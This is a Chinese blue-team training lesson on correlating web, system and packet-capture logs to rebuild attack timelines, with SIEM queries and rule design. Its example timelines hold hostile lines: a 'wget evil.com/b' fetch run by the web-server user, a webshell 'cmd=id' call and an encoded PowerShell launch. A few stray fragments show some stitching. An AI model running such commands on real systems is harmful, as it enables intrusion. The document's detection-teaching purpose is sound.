# Day 10：多源日志关联分析

> **阶段**：第二阶段 · 实战进阶周（初级→中级岗达标） | **难度**：⭐⭐ 基础 | **课时**：2-3小时

---

## 📋 今日学习目标

1. **掌握三源关联分析法**：Web日志 + 系统日志 + 流量包（PCAP），把三个维度的证据交叉验证
2. **学会攻击时间线还原**：从第一个数据包到最后一个后门命令，每一步都要有日志支撑
3. **理解"证据链"的概念**：单源证据可能是巧合，多源证据交叉才能定罪
4. **能独立完成一次多源关联分析**：给定Web日志+Secure日志+PCAP摘要，还原完整攻击过程
5. **输出标准化的《攻击事件时间线还原报告》**：结构清晰，逻辑无断档

## 📖 核心知识讲解

### 一、为什么要多源关联？

单看一种日志就像**单眼看世界**——你能看到一部分，但看不到全貌。

```
单源视角的局限：

只看Web日志 → 知道有人扫了目录、发了POST，但不知道他登没登录系统
只看系统日志 → 知道有人登录了、执行了命令，但不知道他怎么进来的
只看流量包 → 知道数据传输了，但不知道在应用层面发生了什么

三源关联的威力：

Web日志：   攻击者通过文件上传把 shell.php 放到了服务器上 ✅
系统日志：  3分钟后，www-data用户执行了 /bin/bash -c "wget evil.com/b" ✅
流量包：   出站流量发现 DNS 查询 evil.com，随后有加密数据传输 ✅

三条线交汇 → 攻击全貌清晰呈现！
```

### 二、三源日志的"互补坐标系"

把三种日志想象成三个不同的摄像头：

```
┌────────────────────────────────────────────────────┐
│                                                    │
│    Web日志          系统日志          流量包(PCAP)   │
│    (应用层)          (主机层)           (网络层)    │
│                                                    │
│  看什么：           看什么：           看什么：      │
│  · 请求了什么URL     · 谁登录了         · 原始数据包  │
│  · 带了什么参数      · 执行了什么命令    · 完整Payload │
│  · 返回了什么内容    · 改了什么文件      · 加密前内容  │
│  · User-Agent       · 提权了什么权限    · 协议细节    │
│                                                    │
│  盲区：             盲区：             盲区：        │
│  · 加密后的payload  · HTTP具体内容     · 解密后内容  │
│  · 系统内部动作     · 流量内容         · 系统内部行为 │
│                                                    │
└────────────────────────────────────────────────────┘

三者同看 → 360度无死角！
```

### 三、关联分析的三种核心方法

#### 方法1：时间线对齐法

```
取三种日志，按时间排序，放在同一张表里：

时间         Web日志               系统日志              流量包
09:00:00    GET / (探测首页)        -                      SYN 80端口
09:00:05    POST /login (尝试登录)  -                      HTTP POST
09:00:06    -                      sshd: Failed pwd root   -
09:00:07    -                      sshd: Failed pwd admin  -
09:00:08    -                      sshd: Accepted pwd user SSH ESTABLISHED
09:05:00    GET /uploads/1.php     -                      HTTP GET .php
09:05:01    -                      user执行 wget           DNS查询evil.com
09:05:05    -                      user执行 chmod +x       TCP外连 4444端口

→ 拼凑出完整攻击过程！
```

#### 方法2：IP交叉验证法

```
取一个攻击IP，在三类日志中分别搜索：

Web日志中：   203.0.113.50 做了什么HTTP请求？
系统日志中：  203.0.113.50 是否登录了SSH/RDP？有没有成功的登录？
流量包中：    203.0.113.50 的总流量有多大？有没有异常协议？

如果某一类日志中没有该IP的记录，也说明问题：
- 没有Web日志记录 → 攻击可能走的是非HTTP协议（如直接的SSH暴力破解）
- 没有系统日志记录 → 攻击可能只在Web层面，未突破到系统层
```

#### 方法3：事件串联法

```
不是按时间也不是按IP，而是按"攻击事件"的推进逻辑：

事件1：扫描探测
  → Web日志：大量404
  → 流量包：SYN扫描特征
  → 系统日志：（无记录，扫描不会触及系统层）

事件2：漏洞利用
  → Web日志：POST /upload.php + 200
  → 流量包：multipart/form-data 上传
  → 系统日志：新文件创建（audit.log）

事件3：后门执行
  → Web日志：GET /uploads/shell.php?cmd=id
  → 流量包：HTTP响应含 uid=33
  → 系统日志：www-data执行 /bin/sh

事件4：横向移动
  → Web日志：（无记录）
  → 流量包：SSH流量从Web服务器去往OA系统
  → 系统日志：root从Web服务器SSH登录OA系统
```

### 五、关联分析的常见"断链"与修复

在实际分析中，时间线经常会有"断档"，你需要知道怎么补：

| 断链现象 | 可能原因 | 补链方法 |
|---------|---------|---------|
| Web日志有攻击请求，系统日志无进程 | 攻击未成功，或日志被清除 | 查流量包确认是否有回应数据 |
| 系统日志显示进程异常，Web日志无记录 | 攻击走非HTTP协议 | 查流量包看是否SSH/RDP等其他协议 |
| Web和系统日志都有，但时间对不上 | 各主机NTP时间未同步 | 以流量包的时间戳为准（抓包工具时间一般较准） |
| 流量包加密无法分析内容 | HTTPS/SSH加密 | 看加密前的DNS查询、证书信息、连接元数据 |
| 三源都无记录，但系统确实被入侵了 | 日志被攻击者清除 | 从备份恢复日志、查其他证据（如文件时间戳） |

## 🎯 蓝队面试高频题（Day 10 主题）

**Q1：为什么要做多源日志关联分析？单看一种日志不够吗？**

> 回答：单看一种日志存在"视野盲区"。Web日志只能看到HTTP层面的请求和响应，但看不到攻击者登录系统后的操作；系统日志能看到进程和登录记录，但看不到攻击的完整payload；流量包能看到原始网络数据，但加密流量无法分析内容。只有将三者关联，才能还原完整的攻击全貌。比如一个典型的Webshell攻击：Web日志告诉你webshell上传成功、系统日志告诉你webshell执行了什么命令、流量包告诉你有没有后续的C2通信和数据外传。缺任何一个，你看到的都是不完整的。

**Q2：在关联分析中，如果三类日志的时间对不上怎么办？**

> 回答：时间不同步是关联分析中的常见问题，通常因为各主机的NTP服务未配置。我的处理方案是：①优先以网络流量包的时间戳为准（抓包设备通常时间较准）；②计算各源之间的时间偏移量（如Web服务器比系统快2分钟），统一校正后再关联；③在分析报告中标注"时间已校正"和"偏移量"；④作为改进项，推动运维统一配置NTP。如果时间差太大或无从校正，就降低时间相关性的权重，转而依靠事件逻辑链条（"上传→执行→提权"的因果逻辑）来关联。

**Q3：如果流量包是加密的（HTTPS），怎么从中获取有效信息？**

> 回答：加密流量虽然看不到明文内容，但仍然有大量可用信息：①元数据——源IP、目的IP、端口、连接时长、数据量大小，这些已经能告诉你"谁在和谁通信、传了多少数据"；②握手信息——TLS握手阶段的SNI（服务器名称指示）明文传输，可以知道访问了什么域名；③DNS查询——加密流量前通常有DNS查询，能看到攻击者解析了什么域名；④流量模式——正常Web流量是"请求-响应"模式，C2通信往往是周期性的心跳包，模式完全不同。简单说：加密遮住了内容，但遮不住"行为"。

## ⚠️ 新手常见误区纠正

1. **误区**："三类日志都有记录才算证据，缺一个就说明没发生"
   - **真相**：不同的攻击阶段在不同的日志层留下痕迹。扫描阶段Web日志有系统日志无是正常的，横向移动阶段Web日志无系统日志有也是正常的
   - **正确做法**：理解每种日志的覆盖范围和盲区，合理判断"没有记录"的原因

2. **误区**："时间线就是按时间先后排列就行了"
   - **真相**：单纯的时间排列只是第一步，更重要的是找出**因果关系**。A在B之前发生，不等于A导致了B
   - **正确做法**：时间排列 + 因果分析。每两个相邻事件之间要有"攻击逻辑"的关联

3. **误区**："报告写得越长越好"
   - **真相**：好的时间线报告是"精炼"的——每一条都有证据、每两条之间都有逻辑、每个结论都有依据
   - **正确做法**：报告要"精准"而非"冗长"。核心时间线+关键证据+分析结论，三段式清晰呈现

| Web日志有.php文件上传 | 系统日志查文件创建 + 进程启动 | 确认Webshell是否被执行 |
| 系统日志有陌生进程 | Web日志查.php请求 + 流量包查外连 | 找到入侵入口和C2通信 |
| 流量包有大量出站流量 | 系统日志查进程网络连接 + Web日志查上传 | 确认是什么进程在传、数据从哪来 |
| 三源中只有一个有记录 | 判断是否合理（该阶段本就不该在多源留痕） | 排除日志被清除的可能性 |

## 🔬 深度案例：跨日志源还原APT攻击全貌

### 案例背景

某央企在护网第三天发现一台核心文件服务器的CPU持续100%，管理员以为是硬件故障，准备重启。安全团队介入后发现这不是硬件问题，而是一次持续了72小时的APT攻击。

### 三源日志的交叉分析

**仅看单一日志源会漏掉什么？**

```
如果只看Web日志：
  看到：45.33.32.156对OA系统做了几次SQL注入尝试
  判断：P2中危，封IP就完了 → 漏掉后续的横向移动和数据窃取！

如果只看系统日志：
  看到：文件服务器凌晨2点出现了异常进程
  判断：可能是系统异常 → 重启看看 → 破坏了证据！

如果只看流量包：
  看到：文件服务器有大量出站流量
  判断：可能是备份任务 → 加个带宽限制 → 攻击者换个端口继续传！

三源同时看才能真正还原真相 ↓↓↓
```

## 🛠️ ELK/Splunk 多源关联查询实战

### 为什么需要日志平台

```
手工 grep 的局限：
  → 需要SSH到多台机器上去查（极其低效）
  → 不同日志的时间格式不一样（Syslog vs Nginx vs Windows EventLog）
  → 没法做跨日志源的实时关联（手工要来回切换窗口对时间）
  → 没法做可视化（图表、趋势、地图）

ELK/Splunk的优势：
  → 所有日志在一个平台上
  → 时间自动统一格式化（不管你原始是什么格式）
  → 跨日志源关联查询（一条查询语句同时查Web日志+系统日志+流量）
  → 可视化仪表盘实时展示
```

### 实战查询示例

```sql
-- 查询1：找出同一IP在Web日志和系统日志中都出现的记录
-- Splunk SPL语法
(index=web_log OR index=sys_log) src_ip="45.33.32.156"
| stats count by index, sourcetype
| chart count over sourcetype by index

-- 结果解读：
-- web_log有记录 + sys_log无记录 = 攻击停留在Web层面
-- web_log有记录 + sys_log有记录 = 攻击已突破到系统层 → P0/P1！


-- 查询2：发现"Webshell上传→命令执行→外连"C2"的完整攻击链
-- 思路：把三个指标用OR连起来，按时间排序
(index=web_log uri="*.jsp" OR uri="*.php")       -- webshell访问
OR (index=sys_log EventCode=4688)                 -- 进程创建
OR (index=netflow dst_ip NOT "10.0.0.0/8" AND bytes_out > 1000000)  -- 大流量外传
| transaction src_ip maxspan=1h                  -- 同一IP在1小时内的所有事件串起来
| where eventcount > 3                           -- 至少3类事件都有
| table _time, src_ip, event_description


-- 查询3：在加密流量（HTTPS）中找C2通信特征
-- 虽然看不到HTTPS内容，但元数据也能暴露C2！
(index=proxy OR index=firewall) 
  dst_port=443 
  src_ip="10.0.0.0/8"            -- 内网IP
  dst_ip NOT "10.0.0.0/8"        -- 外网IP
  NOT dst_hostname IN (*.google.com, *.microsoft.com, *.amazonaws.com)  -- 排除已知云服务
| stats count, sum(bytes_out) as total_bytes by src_ip, dst_ip, dst_hostname
| where count > 1000 AND count < 5000  -- C2心跳通常是规律的，每分钟几次
| sort - total_bytes


-- 查询4：发现横向移动——同一内网IP连接了多台其他内网IP
(index=sys_log EventCode=4624 LogonType=3)    -- 网络登录成功
  src_ip="10.0.0.0/8"
| stats dc(TargetHostName) as unique_hosts, values(TargetHostName) as hosts by src_ip
| where unique_hosts > 3                      -- 连接超过3台不同的机器
| sort - unique_hosts
```

### 练习A：断链分析

以下是一份不完整的攻击时间线，多处有断链。请补全：

```
时间        Web日志              系统日志              流量包
08:00      203.0.113.50 GET /    -                     SYN扫描
08:05      【断链1：无Web记录】  sshd: Failed pwd root   -
08:06      【断链2：无Web记录】  sshd: Failed pwd admin   -
08:07      【断链3：无Web记录】  sshd: Accepted pwd root  SSH ESTABLISHED
08:15      GET /upload/shell.php -                     HTTP GET .php
08:16      【断链4：无Web记录】  进程：root执行 mysqldump  -
08:20      【断链5：无Web记录】  -                      大量出站流量
```

**补全分析**：
```
断链1-3：8:05-8:07之间Web日志无记录
  → 原因：攻击是通过SSH暴力破解进行的，不走Web协议
  → 所以Web日志中没有记录是正常的（不是日志丢失）
  → 系统日志中能看到完整的SSH暴力破解过程

断链4：8:16系统日志显示mysqldump，但Web日志无记录
  → 原因：mysqldump是通过SSH session执行的，不经过Web服务器
  → 补充验证：查MySQL的general_log，确认8:16有dump操作
  → 查mysqldump的输出文件路径和大小

断链5：8:20有出站流量，但Web和系统日志都没有
  → 原因：攻击者可能使用自定义工具或加密通道外传数据
  → 补充验证：查出站流量的目标IP、端口、传输量
  → 查出站流量的源进程（通过netstat -anp在时间窗口内查看）
  → 如果无法确定源进程 → 很可能是攻击者的自定义外传工具
```

### 练习B：构造SIEM关联规则

为以下攻击场景编写SIEM关联规则（用人类语言描述规则逻辑即可）：

```
场景1：Webshell上传+执行
规则逻辑：
  IF (Web日志中出现.php/.jsp文件上传成功 [状态码200])
     AND (30分钟内，系统日志中对应服务器出现新进程创建)
     AND (该进程由Web服务器的运行账户执行 [如www-data/tomcat])
  THEN 告警：P1 "疑似Webshell上传并执行"
  证据：关联具体的Web请求记录 + 系统进程记录

场景2：SQL注入 → 数据库dump
规则逻辑：
  IF (WAF/SIEM检测到SQL注入payload含 information_schema/load_file/INTO OUTFILE)
     AND (30分钟内，同一目标服务器的MySQL slow_log中出现异常查询 [扫描时间>1秒])
     AND (同一时间段，服务器磁盘空间突然减少 > 500MB)
  THEN 告警：P0 "SQL注入成功+疑似数据库dump"
  证据：WAF告警记录 + MySQL slow_log + 磁盘空间变化

场景3：横向移动（Pass-the-Hash）
规则逻辑：
  IF (Windows EventID 4624 登录类型=3 且 认证包名=NTLMSSP 且 源IP不是域控)
     AND (同一源IP在30分钟内登录了3台以上不同的机器)
     AND (这些登录发生在非工作时间)
  THEN 告警：P1 "疑似Pass-the-Hash横向移动"

场景4：DNS隧道数据外传
规则逻辑：
  IF (DNS查询的域名长度 > 50字符)
     AND (同一源IP的DNS查询频率 > 100次/分钟)
     AND (查询的域名不解析到已知CDN/云服务IP)
     AND (DNS查询的TXT记录响应大小 > 200字节)
  THEN 告警：P1 "疑似DNS隧道数据外传"
```

## 📊 Zeek（Bro）日志——网络层的"全息监控"

### Zeek产生的核心日志文件

```markdown
Zeek（原名Bro）是全流量分析的核心工具，它能从网络流量中提取结构化的日志：

conn.log — 连接日志（最重要！）
  → 每条TCP/UDP/ICMP连接一条记录
  → 关键字段：uid(唯一标识)、id.orig_h(源IP)、id.resp_h(目的IP)、
    proto(协议)、service(应用层协议)、duration(持续时间)、
    orig_bytes/resp_bytes(传输字节数)、conn_state(连接状态)

http.log — HTTP请求日志
  → 每条HTTP请求一条记录
  → 关键字段：host、uri、method、status_code、user_agent、referrer

dns.log — DNS查询日志
  → 每条DNS查询一条记录
  → 关键字段：query(查询域名)、qtype_name(查询类型)、answers(响应IP)

files.log — 文件传输日志
  → HTTP/FTP/SMB中传输的每个文件一条记录
  → 关键字段：filename、mime_type、sha256、seen_bytes(传输字节数)

ssl.log — SSL/TLS握手日志
  → 关键字段：server_name(SNI)、issuer(证书颁发者)、
    ja3(客户端指纹)、ja3s(服务端指纹)

notice.log — Zeek告警日志
  → Zeek内置检测引擎产生的告警
  → 如：扫描检测(Scan::Port_Scan)、SSL无效证书、DNS隧道等

x509.log — SSL证书解析日志
  → 关键字段：certificate.subject、certificate.issuer、
    certificate.valid_from/valid_until

实战中Zeek日志的关联查询：
```

```bash
# 1. 找出所有连接目标为境外IP且传输了大量数据的连接
cat conn.log | zeek-cut id.orig_h id.resp_h orig_bytes resp_bytes | \
  awk '$4 > 1000000 {print $1" → "$2" 上传"$3"字节 下载"$4"字节"}' | \
  while read line; do
    ip=$(echo $line | awk '{print $3}' | cut -d'→' -f2 | tr -d ' ')
    # 简单判断是否境外IP
    if ! echo $ip | grep -qE '^(10\.|172\.(1[6-9]|2\d|3[01])\.|192\.168\.)'; then
      echo "⚠️ $line"
    fi
  done

# 2. 关联conn.log和dns.log — 找出和恶意域名通信的内网IP
# 先用dns.log找出解析过恶意域名(evil.com)的源IP
cat dns.log | zeek-cut id.orig_h query | grep "evil.com"
# → 假设结果：10.0.5.27

# 再用conn.log找出这个IP的所有外联
cat conn.log | zeek-cut uid id.orig_h id.resp_h id.resp_p proto service | \
  grep "10.0.5.27"

# 3. 检测DNS隧道：异常的DNS查询频率和域名长度
cat dns.log | zeek-cut id.orig_h query | awk '{print $1, length($2), $2}' | \
  awk '$2 > 50 {print "⚠️ 长域名DNS查询: "$0}'
# → 正常的DNS域名通常不超过30字符，超过50字符的高度可疑
```

output {

  }
}

## 🚨 SIEM告警疲劳——蓝队最大的隐形敌人

告警疲劳（Alert Fatigue）是护网蓝队的头号杀手。当一个分析师每小时收到200+条告警而其中95%是误报时，他的大脑会进入"自动忽略模式"——连那5%的真实告警也被忽略了。

### 告警疲劳的真实数据

```markdown
某大型企业SOC的真实数据（2023年统计）：
→ 每日告警总量：约8,500条
→ 其中误报：约7,900条（93%）
→ 其中重复告警：约3,200条（38%——同一条攻击触发了3个不同规则）
→ 需要升级的P0/P1事件：约15条（0.18%）
→ 人均每小时处理告警：约50条（根本看不完）

分析师的实际状态：
→ 前2小时：认真看每条告警
→ 第3-4小时：开始快速扫过，只点"已处理"
→ 第5小时：已经"麻了"，视觉自动过滤告警列表
→ 真实案例：一条P0级别的C2通信告警在列表中躺了45分钟才被发现
           原因：它被夹在380条"端口扫描"和"暴力破解"告警中间
```

### 告警疲劳的五个解药

```markdown
解药1：告警聚合（Alert Aggregation）
  同源IP+同目标+同攻击类型的告警 → 合并为1条聚合告警
  例如：45.33.x.x在5分钟内对/api/products发起了200次SQL注入尝试
  → 不要200条告警，而是1条"45.33.x.x 对 /api/products 进行了批量SQL注入测试"
  → SIEM配置：基于src_ip + dst_ip + attack_type + 时间窗口(5分钟) 进行聚合

解药2：告警抑制（Alert Suppression）
  已知的、无害的、已处理的告警 → 抑制不显示
  例如：内部漏洞扫描器(10.x.x.x)每天扫描产生的告警 → 加白名单
  例如：已封禁的IP产生的后续告警 → 自动抑制
  → 关键：抑制要有时效性！7天后自动解除抑制，防止"永远隐藏"

解药3：告警优先级动态调整
  不是"每种规则定一个静态优先级"，而是根据上下文动态调整
  例如：一句话规则"SQL注入=P1" → 但如果是测试环境的SQL注入 → 降为P3
                                       如果是生产数据库的SQL注入 → 确认为P0
  上下文因素：目标资产重要性 × 攻击成功概率 × 数据敏感度 × 当前安全态势

解药4：告警质量度量
  每个季度统计：每个规则产生了多少告警？其中多少是真实攻击？
  → 如果某规则过去90天产生了3000条告警但0条真实攻击 → 该规则应调整或退役
  → 如果某规则产生了3条告警全部是真实攻击 → 该规则是"金规则"，应该是最高优先级
  → 用数据说话，不要靠感觉

解药5：分析师工作量保护
  每个分析师的告警队列有上限（如最多50条）
  → 超过上限的告警自动降级为"批量待处理"（降低分析师的心理压力）
  → 但关键告警(P0)必须在90秒内弹窗强制attention
  → 告警按级别分队列：P0队列（绝不超过3条）、P1队列（不超过15条）、P2/P3队列
```

### 真实案例：如何从500条告警中捞出1条真实的C2通信

```markdown
场景：SIEM中出现了500条告警，其中499条是常规扫描和误报。
      但有一条是真实的CobaltStrike C2心跳。

❌ 错误的做法：从第1条开始逐条看 → 看到第50条时已经开始麻木
                              → 到第200条时完全失去判断力
                              → 可能漏掉C2告警

✅ 正确的做法（5分钟筛选法）：
第1分钟：按"攻击类型"分组 → 400条是"端口扫描"、50条是"暴力破解"、
         30条是"SQL注入尝试"、15条是"文件上传"、3条是"C2通信检测"、
         2条是"恶意软件下载"
  → 立刻忽略"端口扫描"(400条)，因为它是信息收集阶段，不是入侵
  → 重点关注"C2通信检测"(3条)和"恶意软件下载"(2条)

第2分钟：对3条C2告警做快速核查
  → C2告警1：目标IP 45.33.x.x，VirusTotal检出12/89→高度可疑
  → C2告警2：目标IP 8.8.8.8...这是Google DNS→误报，忽略
  → C2告警3：目标IP 185.x.x.x，VirusTotal检出38/89→确认恶意！

第3分钟：追溯185.x.x.x连接的内网源IP
  → 在SIEM中搜索：过去24小时内哪个内网IP连接了185.x.x.x？
  → 结果：10.1.5.44(Web-03) 有3次连接，每次间隔60秒→心跳特征！

第4分钟：确认Web-03是否已被入侵
  → 在EDR中查询Web-03过去24小时的进程创建事件
  → 发现 w3wp.exe → cmd.exe → powershell -enc... → 确认Webshell执行！

第5分钟：立刻启动应急响应 → 隔离Web-03，通知组长，开始溯源
```

## 🛠️ SIEM规则开发的"正确姿势"——从一条伪代码到可用的检测规则

SIEM规则不是你脑子里想的"如果看到4625就告警"，而是一个不断测试、调优、上线、维护的工程过程：

```markdown
【一条SIEM规则的完整生命周期】

阶段1：发现需求（"我们缺一个检测X的规则"）
  来源：安全事件复盘 / ATT&CK覆盖率评估 / 威胁情报 / 红蓝对抗发现
  
  示例需求："检测攻击者通过WMI实现横向移动"

阶段2：设计检测逻辑（用英语描述，不是写代码）
  检测对象：Windows EID 4688（新进程创建）+ 父进程是wmiprvse.exe
  检测条件：
    ① 进程创建事件（4688）
    ② 父进程名称 = wmiprvse.exe
    ③ 子进程名称不是常见的合法程序（如wmic.exe, scrcons.exe）
    ④ 子进程的名称是 cmd.exe / powershell.exe / 或可疑的exe
  排除条件：已知的运维操作（如SCCM/SCOM发起的WMI操作）

阶段3：写伪代码（确认逻辑没问题）
  IF EventID == 4688
  AND ParentProcessName == "wmiprvse.exe"
  AND ChildProcessName NOT IN ("wmic.exe", "scrcons.exe", "mofcomp.exe")
  AND (ChildProcessName IN ("cmd.exe", "powershell.exe", "cscript.exe", "wscript.exe")
       OR ChildProcessName matches "*.exe" with path NOT in "C:\Windows\*")
  THEN Alert with Severity HIGH

阶段4：转化为SIEM查询语句（以Elastic Query为例）
  event.code: "4688"
  AND process.parent.name: "wmiprvse.exe"
  AND NOT process.name: ("wmic.exe" OR "scrcons.exe" OR "mofcomp.exe")
  AND (process.name: ("cmd.exe" OR "powershell.exe" OR "cscript.exe")
       OR (process.name: *.exe AND NOT process.executable: "C\:\\Windows\\*" ))

阶段5：回溯测试（最关键的一步！）
  在SIEM中用过去30天的数据运行这个规则：
  → 看看会产生多少告警？
  → 如果产生5000条 → 规则太宽，需要加更多排除条件
  → 如果产生3条 → 可能太窄（但也可能说明你的环境干净）
  → 逐条检查产生的告警，人工判断是否为真实攻击
  
  目标：
  → 误报率 < 10%（10条告警中至少9条是真实攻击或值得关注的）
  → 每天产生的告警 < 50条（不能让分析师被淹死）
  → 至少覆盖了你已知的1个真实攻击案例

阶段6：先"静默"上线（只记录不告警）
  把规则在SIEM中上线，但设置为"仅生成日志，不发出告警"
  观察1周 → 记录匹配了几次、每次的上下文是什么
  
阶段7：正式上线为告警规则
  确认误报率可接受后 → 切换为"生成告警"
  设置合理的优先级：WMI横向移动 → 至少P2
  配置告警通知：谁在什么时候通过什么渠道接收这个规则产生的告警？

阶段8：持续维护（不是一配了之）
  每月检查：这个规则的误报率有变化吗？有没有新的合法场景触发了这个规则？
  每季度评估：这个攻击手法还常见吗？规则需要更新吗？
```

**规则开发的常见错误：**

```markdown
❌ 错误1："看一遍觉得逻辑没问题就上线"
   → 上线后一天3000条告警→分析师疯了→立刻关掉规则→规则白写了

❌ 错误2："把所有排除条件写死，一条告警都不会误报"
   → 太严格的规则 = 什么也检测不到 = 形同虚设

❌ 错误3：复制粘贴互联网上的规则直接上线
   → 网上规则的上下文和你的环境完全不一样
   → 别人环境里罕见的正常行为，在你环境里可能天天发生

✅ 正确做法：理解规则的检测逻辑 → 在自己的历史数据中回溯测试 
  → 先静默观察 → 再正式上线 → 持续维护
```
